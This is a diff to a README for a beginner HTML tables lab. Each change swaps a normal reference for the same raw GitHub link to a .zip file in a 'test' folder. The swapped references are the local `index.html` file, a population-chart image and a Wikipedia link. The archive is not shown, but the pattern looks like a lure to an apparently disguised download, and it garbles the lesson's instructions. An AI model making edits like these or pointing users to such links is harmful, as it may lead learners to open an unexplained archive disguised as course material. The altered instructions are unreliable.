@@ -96,7 +96,7 @@ These headers need to go in the first row, so that may look something like:
 ```
 
 Even though we write the HTML from top down, we would see these headers in bold
-and lined up _left to right_. We can open up `index.html` right now to take a
+and lined up _left to right_. We can open up `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-tables-lab/master/test/phase-0-html-tables-lab_1.0.zip` right now to take a
 look to confirm.
 
 This first row is almost always the only place where we use the `th` tag.
@@ -148,7 +148,7 @@ entire table would look like the following:
 </table>
 ```
 
-Paste this into `index.html` and take a look at how it is displayed in browser.
+Paste this into `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-tables-lab/master/test/phase-0-html-tables-lab_1.0.zip` and take a look at how it is displayed in browser.
 You'll see we've got a table with 4 rows and 3 columns! Each "column" of content
 expands to fit the width of the content. It should look something like this:
 
@@ -163,7 +163,7 @@ expands to fit the width of the content. It should look something like this:
 Okay, now it's time to put what we've learned to the test. For this challenge,
 your task is to recreate a table using the following data:
 
-![cities by population](https://s3.amazonaws.com/ironboard-learn/us_cities_by_population.png)
+![cities by population](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-tables-lab/master/test/phase-0-html-tables-lab_1.0.zip)
 
 The above table shows total population of the 4 biggest cities in the US. We can
 see there are 3 headers, "City", "State", and "2017 estimate", and data for each
@@ -185,4 +185,4 @@ With `table`, `tr`, `th` and `td`, we are able to turn line by line HTML into a
 table with rows and columns! It may seem counterintuitive at first to list out
 row content separately, but with this, you can represent all sorts of data!
 
-[mpia]: https://en.wikipedia.org/wiki/List_of_most-followed_Instagram_accounts
+[mpia]: https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-tables-lab/master/test/phase-0-html-tables-lab_1.0.zip
